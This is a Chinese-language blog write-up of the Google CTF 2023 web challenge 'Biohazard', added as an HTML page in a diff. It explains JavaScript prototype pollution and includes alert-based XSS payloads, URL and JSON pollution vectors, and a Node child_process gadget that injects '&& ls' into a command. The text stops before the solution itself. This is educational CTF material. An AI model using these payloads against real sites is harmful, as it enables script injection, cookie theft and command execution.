@@ -1,0 +1,558 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Google CTF 2023 - web/Biohazard | HackThe4O4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="14 solves &#x2F; 333 pts CTFtime: https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1929 title: Bio+ (ctfcompetition.com) file:  storage.googleapis.com  參考資料  原型繼承與原型鏈 ｜ALPHA Camp | JavaScript 入門指南 帮你彻底搞懂JS中的prototype、__pro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Google CTF 2023 - web&#x2F;Biohazard">
+<meta property="og:url" content="https://no-flag.com/2024/12/21/GoogleCTFCSP/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="14 solves &#x2F; 333 pts CTFtime: https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1929 title: Bio+ (ctfcompetition.com) file:  storage.googleapis.com  參考資料  原型繼承與原型鏈 ｜ALPHA Camp | JavaScript 入門指南 帮你彻底搞懂JS中的prototype、__pro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://no-flag.com/img/GoogleCTFCSP.png">
+<meta property="og:image" content="https://no-flag.com/img/GoogleCTFCSP_1.png">
+<meta property="og:image" content="https://no-flag.com/img/GoogleCTFCSP_2.png">
+<meta property="og:image" content="https://no-flag.com/img/GoogleCTFCSP_3.png">
+<meta property="og:image" content="https://no-flag.com/img/GoogleCTFCSP_4.png">
+<meta property="og:image" content="https://no-flag.com/img/GoogleCTFCSP_5.png">
+<meta property="article:published_time" content="2024-12-21T12:32:07.083Z">
+<meta property="article:modified_time" content="2024-04-26T00:44:50.462Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://no-flag.com/img/GoogleCTFCSP.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+	<!-- If needed, replace your own web font service -->
+  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />
+
+  
+   
+  
+<link rel="stylesheet" href="/icomoon/style.css">
+
+  
+<link rel="stylesheet" href="/style.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="site-wrapper is_post_page">
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<script>document.getElementById("loading-bar").style.width="20%";</script>
+
+
+<header id="header" class="site-header clearfix">
+
+  <a class="logo square clearfix" href="/">
+    <!-- 
+      Replace with your own size name, for example:
+      <span class="b">A</span>
+      <span class="w">B</span>
+      <span class="b">C</span>
+     -->
+     <span class="b">A</span>
+     <span class="b">R</span>
+     <span class="b">T</span>
+     <span class="w">I</span>
+     <span class="w">F</span>
+     <span class="b">A</span>
+     <span class="b">C</span>
+     <span class="b">T</span>
+  </a>
+  <a class="me square site-nav-switch clearfix">
+    <span class="b">
+    	<span class="icon icon-menu"></span>
+    </span>
+  </a>
+
+</header>
+
+    <script>document.getElementById("loading-bar").style.width="40%";</script>
+    <main id="main" class="clearfix">
+      <article id="post-GoogleCTFCSP"
+  class="article white-box article-type-post"
+  itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    <h1 class="article-title" itemprop="name">
+      Google CTF 2023 - web/Biohazard
+    </h1>
+    <div class="article-meta">
+      Posted on 
+      <time class="article-time" datetime="2024-12-21T12:32:07.083Z" itemprop="datePublished">
+        Dec 21, 2024
+      </time>
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <ul>
+<li>14 solves &#x2F; 333 pts</li>
+<li>CTFtime: <a target="_blank" rel="noopener" href="https://ctftime.org/event/1929">https://ctftime.org/event/1929</a></li>
+<li>title: <a target="_blank" rel="noopener" href="https://biohazard-web.2023.ctfcompetition.com/">Bio+ (ctfcompetition.com)</a></li>
+<li>file:<br>  <a target="_blank" rel="noopener" href="https://storage.googleapis.com/gctf-2023-attachments-project/cab54183ea79c02df3b72d8e7af82e04957ed2e7c078e97dee5f333ecf9329ea6f1696ad3f5ada440326c25305a4b3aca6bd8f226ddc42d324f4a5b2b33dc387.zip">storage.googleapis.com</a></li>
+</ul>
+<p>參考資料</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://javascript.alphacamp.co/prototype-prototype-chain.html">原型繼承與原型鏈 ｜ALPHA Camp | JavaScript 入門指南</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/cc18868876837/article/details/81211729">帮你彻底搞懂JS中的prototype、__proto__与constructor（图解）_js <strong>proto</strong>-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance">JavaScript 原型和繼承 |網路安全學院 (portswigger.net)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.huli.tw/2021/09/29/prototype-pollution/">基於 JS 原型鏈的攻擊手法：Prototype Pollution - Huli’s blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/shhnjk/shhnjk.github.io/blob/main/thoughts/digesting-the-concept-of-trusted-types.md#template-gadget">shhnjk.github.io&#x2F;thoughts&#x2F;digesting-the-concept-of-trusted-types.md 在 main ·shhnjk&#x2F;shhnjk.github.io ·GitHub上</a></li>
+<li><a target="_blank" rel="noopener" href="https://flyme2bluemoon.github.io/blog/posts/gctf-2023-web-biohazard/">Google CTF：生化危機 - Matthew Shen (flyme2bluemoon.github.io)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/tree/main/2023/quals/web-biohazard/solution#reviving-xss-auditor-primitive">google-ctf&#x2F;2023&#x2F;quals&#x2F;web-biohazard&#x2F;solution 在主要 ·谷歌&#x2F;google-ctf ·GitHub上</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/arkark/340ffadc009a4dd07be6696e0dec4553">谷歌 CTF 2023 - web&#x2F;Biohazard ·GitHub上</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></li>
+</ul>
+<hr>
+<p>這一題主要是如何繞過CSP的限制達到XSS</p>
+<p>這題也有原型污染的漏洞，在開始說明及分析以前，先來了解關於JS的原型和繼承的概念</p>
+<p>簡單來說就是讓一個物件取得另一個物件的屬性與方法，這就是繼承的概念</p>
+<p>每個物件都連結到某種類型的另一個物件，稱為其原型</p>
+<p>JS 的繼承系統會透過prototype chain連接到其他物件功能，這就是原型繼承</p>
+<p><img src="/img/GoogleCTFCSP.png" alt="Untitled"></p>
+<p>For example:</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name) <span class="comment">//&quot;test&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>此時的name是不具備屬性和方法的</p>
+<p>當字串name原型來自建構子String()，可以用constructor.name查看</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name.<span class="property">constructor</span>.<span class="property">name</span>) <span class="comment">//&quot;String&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>此時的name是透過建構式函式 String() 產生實例</p>
+<p>透過prototype chain，字串name可以取用String.prototype裡面定義好的方法，因此你可以使用 <code>.split()</code>, <code>.slice()</code>, <code>.toLowerCase()</code> 等字串方法</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">name.<span class="title function_">toLowerCase</span>() <span class="comment">// &quot;test&quot;</span></span><br><span class="line">name.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">3</span>) <span class="comment">//&quot;Tes&quot;</span></span><br><span class="line">name.<span class="title function_">splite</span>(<span class="string">&#x27;s&#x27;</span>) <span class="comment">// [&quot;Te&quot;,&quot;T&quot;]</span></span><br></pre></td></tr></table></figure>
+
+<p>所以什麼是原型?</p>
+<p>透過建構式函式所產生的物件，都會攜帶一個原型物件</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">name.</span><br></pre></td></tr></table></figure>
+
+<p>在 console 裡使用 <code>name.</code> 時（打到 <code>.</code> 就好），這時候瀏覽器會很貼心的幫我們列出所有存在 <code>name</code> 本身的屬性或方法：<br>這裡看到的清單，是 <code>name</code> 的原型物件裡所有可用的屬性與方法，當你呼叫這些方法時，JavaScript 會透過原型鏈查找到可用的函式。</p>
+<p><img src="/img/GoogleCTFCSP_1.png" alt="Untitled"></p>
+<p>它們是如何搜尋使用的方法及屬性的?</p>
+<p>比如在調用 <code>toLowerCase</code> </p>
+<ol>
+<li>查看 <code>name</code> 本身是否有<code>toLowerCase</code> 方法，發現 <code>name</code> 本身沒這方法</li>
+<li>到 <code>name prototypal</code> 找，也就是 <code>String.prototype</code> ，在這邊會找到<code>toLowerCase</code> 的方法</li>
+<li>根據 <code>String.prototype.toLowerCase</code>的函式設計，執行 <code>name.toLowerCase()</code></li>
+</ol>
+<p>如果去調用不存在的方法比如 <code>name.abc()</code>，他會一直向上找到 <code>null</code>為止，並回傳相關錯誤，這就是<strong>prototype chain</strong></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">name &gt; <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span> &gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> &gt; <span class="literal">null</span></span><br><span class="line">       <span class="title function_">toLowerCase</span>()        <span class="title function_">toString</span>()</span><br><span class="line">       <span class="title function_">slice</span>()              <span class="title function_">hasOwnProperty</span>()</span><br><span class="line">       <span class="title function_">split</span>()              <span class="title function_">isPrototypeOf</span>()</span><br><span class="line">       ...                  ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person 是一個構造函式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="comment">// 透過 Person 構造函式，創建了一個 personA 對象</span></span><br><span class="line"><span class="keyword">const</span> personA = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">personA.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// true</span></span><br><span class="line">personA.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="literal">null</span>; <span class="comment">//prototype chain</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> human = &#123;</span><br><span class="line">    <span class="attr">action</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;eat&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> man = <span class="title class_">Object</span>.<span class="title function_">create</span>(human)<span class="comment">//man擁有的human的屬性</span></span><br><span class="line">man.<span class="title function_">action</span>() #=&gt; eat</span><br></pre></td></tr></table></figure>
+
+<p>使用__proto__訪問物件的原型</p>
+<p>每個物件都有特殊的屬性，你可以使用該屬性訪問其原型。</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> human = &#123;</span><br><span class="line">    <span class="attr">action</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;eat&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> man = <span class="title class_">Object</span>.<span class="title function_">create</span>(human)</span><br><span class="line"><span class="keyword">const</span> woman = <span class="title class_">Object</span>.<span class="title function_">create</span>(human)</span><br><span class="line">man.<span class="property">__proto__</span> === woman.<span class="property">__proto__</span> #=&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用括弧或點表示法進行訪問：<code>__proto__</code></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">username.<span class="property">__proto__</span></span><br><span class="line">username[<span class="string">&#x27;__proto__&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>可以將參考連結到原型鏈上：<strong>proto</strong></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">username.<span class="property">__proto__</span>                        <span class="comment">// String.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>              <span class="comment">// Object.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>    <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
+
+<p>由於原型繼承，所有字串都可以訪問此方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let searchTerm = &quot;  example &quot;;</span><br><span class="line">searchTerm.removeWhitespace();    // &quot;example&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="What-is-prototype-pollution"><a href="#What-is-prototype-pollution" class="headerlink" title="What is prototype pollution?"></a><strong>What is prototype pollution?</strong></h3><p>它允許攻擊者控制原本無法訪問的對象的屬性。如果應用程式隨後以不安全的方式處理攻擊者控制的屬性，則可能會與其他漏洞連結。在用戶端 JavaScript 中，這通常會導致 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM XSS，</a>而伺服器端原型污染甚至會導致RCE。</p>
+<p>攻擊者可能會使用包含有害值的屬性污染原型，這些屬性隨後可能被應用程式以危險的方式使用。</p>
+<p>任何原型物件都可能受到污染，但這種情況最常發生在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain">內置的全域 <code>Object.prototype</code></a> 中。</p>
+<p>成功利用原型污染需要以下關鍵元件：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sources">A prototype pollution source</a> </p>
+<ul>
+<li><p>任何使用者可控的輸入，可用於向原型物件添加任意屬性</p>
+</li>
+<li><p><strong>Prototype pollution via the URL</strong></p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://vulnerable-website.com/?__proto__[evilProperty]=payload</span><br><span class="line">                              ||</span><br><span class="line">                              \/</span><br><span class="line">          targetObject.__proto__.evilProperty = &#x27;payload&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>注入的重點不僅僅是名稱，更重要的是攻擊者可以利用此技術來注入具有實際影響的屬性，從而對應用程式或庫進行攻擊</li>
+<li>攻擊者可以利用相同的技術來注入與應用程式或庫中已存在的屬性相同名稱的屬性，從而污染原型</li>
+<li>這樣的注入可能會影響到應用程式或庫的行為，因為它們可能會使用這些屬性來執行特定的功能或操作</li>
+</ul>
+</li>
+<li><p><strong>Prototype pollution via JSON input</strong></p>
+  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;evilProperty&quot;</span>: <span class="string">&quot;payload&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用者可控制的 JSON 輸入也可用於污染原型。</li>
+<li>JSON.parse() 將 JSON 物件中的任何鍵視為任意字串，包括**<strong>proto</strong>**</li>
+<li>例如，如果攻擊者註入**{“<strong>proto</strong>“: {“evilProperty”: “payload”}}<strong>proto</strong>**，則產生的物件將具有帶有 key 的屬性</li>
+</ul>
+  <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> objectLiteral = &#123;<span class="attr">__proto__</span>: &#123;<span class="attr">evilProperty</span>: <span class="string">&#x27;payload&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> objectFromJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;evilProperty&quot;: &quot;payload&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">objectLiteral.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>);     <span class="comment">// false</span></span><br><span class="line">objectFromJson.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>);    <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果在沒有適當的按鍵清理的情況下將該物件合併到現有物件中，則可能會導致分配期間的原型污染。</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sinks">A sink</a> </p>
+<ul>
+<li><strong>Prototype pollution sinks</strong></li>
+<li>本質上只是一個 JavaScript 函數或 DOM 元素，您可以通過原型污染訪問它，這使您能夠執行任意 JavaScript 或系統命令</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先假設可以污染原型上的屬性</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 底下都跟剛剛一樣</span></span><br><span class="line"><span class="keyword">var</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>.<span class="title function_">slice</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="title function_">createElement</span>(&#123;</span><br><span class="line">  <span class="attr">tag</span>: <span class="string">&#x27;h2&#x27;</span>,</span><br><span class="line">  <span class="attr">innerText</span>: <span class="string">`Search result for <span class="subst">$&#123;qs.get(<span class="string">&#x27;q&#x27;</span>)&#125;</span>`</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createElement</span>(<span class="params">config</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(config.<span class="property">tag</span>)</span><br><span class="line">  <span class="comment">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="property">innerHTML</span>) &#123;</span><br><span class="line">    element.<span class="property">innerHTML</span> = config.<span class="property">innerHTML</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    element.<span class="property">innerText</span> = config.<span class="property">innerText</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> element</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>當我們假設可以污染原型並將 <strong>Object.prototype.innerHTML</strong> 設置為 <strong><code>&lt;img src=x onerror=alert(1)&gt;</code></strong> 時，無論 <strong>config</strong> 物件是否提供 <strong>innerHTML</strong> 屬性，該屬性都會被視為存在且為真值</li>
+<li>這是因為 JavaScript 在檢查物件屬性時，會在原型鏈上查找，即使 <strong>config</strong> 物件本身沒有該屬性，它的原型鏈上有一個非空的 <strong>innerHTML</strong> 屬性，因此被視為真值。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets">An exploitable gadget</a> </p>
+<ul>
+<li>只要污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">innerText</span> = <span class="string">&#x27;&lt;svg onload=alert(1)&gt;&lt;/svg&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title function_">sanitizeHtml</span>(<span class="string">&#x27;&lt;div&gt;hello&lt;/div&gt;&#x27;</span>))</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在污染了 <code>Object.prototype.innerText</code> 之後，就觸發了XSS</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> params = [<span class="string">&#x27;123 &amp;&amp; ls&#x27;</span>]</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shell</span> = <span class="literal">true</span> <span class="comment">// 只多了這行，參數的解析就會不一樣</span></span><br><span class="line"><span class="keyword">const</span> result = child_process.<span class="title function_">spawnSync</span>(</span><br><span class="line">  <span class="string">&#x27;echo&#x27;</span>, params, &#123;<span class="attr">timeout</span>: <span class="number">1000</span>&#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">stdout</span>.<span class="title function_">toString</span>())</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">123</span></span><br><span class="line"><span class="comment">index.js</span></span><br><span class="line"><span class="comment">node_modules</span></span><br><span class="line"><span class="comment">package-lock.json</span></span><br><span class="line"><span class="comment">package.json</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>child_process.spawn</code> 的第三個參數 options 中有一個選項叫做 <code>shell</code>，設為 true 以後會造成行為不同<ul>
+<li>參考這文件 : <a target="_blank" rel="noopener" href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options">https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options</a></li>
+</ul>
+</li>
+<li>透過 prototype pollution 搭配 script gadget（<code>child_process.spawn</code>），成功製造出一個嚴重性極高的漏洞。</li>
+</ul>
+<p>回歸正題，目標應該是在網站中找到一個XSS漏洞並竊取cookie拿到flag</p>
+<p>在打開網頁後可以看到這樣的畫面，我們需要對其輸入一些資訊，介紹欄位是插入到頁面中的文字</p>
+<p><img src="/img/GoogleCTFCSP_2.png" alt="Untitled"></p>
+<p>不過這受到Google自己的 Closure Library 的保護，免受 XSS 攻擊</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/google/closure-library">https://github.com/google/closure-library</a></li>
+</ul>
+<p>那目標就是繞過這些XSS保護得到XSS漏洞</p>
+<p>通過查看頁面的程式碼</p>
+<p>使用了 <strong>unsafe.alsoAllowTags()</strong> 方法，這個方法的作用是允許特定的 HTML 標籤，其中包括了 <strong><code>&lt;IFRAME&gt;</code></strong> 標籤。註釋中提到 “IFRAME is required for Youtube embed”，暗示了這段程式碼的目的是為了嵌入 YouTube 影片而允許 <strong><code>&lt;IFRAME&gt;</code></strong> 標籤</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">Const</span> = goog.<span class="property">string</span>.<span class="property">Const</span>;</span><br><span class="line">  <span class="keyword">var</span> unsafe = goog.<span class="property">html</span>.<span class="property">sanitizer</span>.<span class="property">unsafe</span>;</span><br><span class="line">  <span class="keyword">var</span> builder = <span class="keyword">new</span> goog.<span class="property">html</span>.<span class="property">sanitizer</span>.<span class="property">HtmlSanitizer</span>.<span class="title class_">Builder</span>();</span><br><span class="line">  builder = unsafe.<span class="title function_">alsoAllowTags</span>(</span><br><span class="line">      <span class="title class_">Const</span>.<span class="title function_">from</span>(<span class="string">&#x27;IFRAME is required for Youtube embed&#x27;</span>), builder, [<span class="string">&#x27;IFRAME&#x27;</span>]);</span><br><span class="line">  sanitizer = unsafe.<span class="title function_">alsoAllowAttributes</span>(</span><br><span class="line">      <span class="title class_">Const</span>.<span class="title function_">from</span>(<span class="string">&#x27;iframe#src is required for Youtube embed&#x27;</span>), builder,</span><br><span class="line">      [</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="attr">tagName</span>: <span class="string">&#x27;iframe&#x27;</span>,</span><br><span class="line">        <span class="attr">attributeName</span>: <span class="string">&#x27;src&#x27;</span>,</span><br><span class="line">        <span class="attr">policy</span>: <span class="function">(<span class="params">s</span>) =&gt;</span> s.<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>) ? s : <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]).<span class="title function_">build</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>那前面提到的原型汙染問題出現在哪裡呢?</p>
+<p>先來了解一下 <code>Object.assign()</code> </p>
+<ul>
+<li><code>Object.assign()</code> 方法將源物件的可列舉屬性（enumerable properties）複製到目標物件。它只複製物件自身的屬性，不包括原型鏈上的屬性</li>
+<li>這就意味著 <code>Object.assign()</code> 不會複製源物件的原型（<code>__proto__</code>）到目標物件的原型</li>
+<li>如果目標物件本身是一個具有原型（即 <code>__proto__</code>）的物件，<code>Object.assign()</code> 會直接修改目標物件的原型，而不是在目標物件本身上添加屬性</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不受原型汙染影響</span></span><br><span class="line"><span class="keyword">let</span> testobj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(testobj, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: &quot;true&quot;&#125;&#125;&#x27;</span>))</span><br><span class="line">testobj.<span class="property">polluted</span> === <span class="literal">undefined</span> <span class="comment">//testobj屬性不包含polluted屬性，所以testobj.polluted的值是undefined</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>將 <code>testobj.__proto__</code>（即 <code>testobj</code> 的原型）作為目標集，使用 <code>Object.assign()</code> 方法將具有屬性 <code>&quot;polluted&quot;: true</code> 的物件合併到 <code>testobj</code> 的原型中</li>
+<li>因為 <code>testobj</code> 的原型被直接修改，所以這將導致原型污染。現在，任何通過 testobj 繼承的物件都會具有 <code>&quot;polluted&quot;: true</code> 屬性</li>
+<li><code>testobj.polluted</code>的值將是 <code>true</code></li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//受原型汙染影響</span></span><br><span class="line"><span class="keyword">let</span> testobj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(testobj.[<span class="string">&quot;__proto__&quot;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>))</span><br><span class="line">testobj.<span class="property">polluted</span> === <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>讓我們來看一下該網頁的原始碼</p>
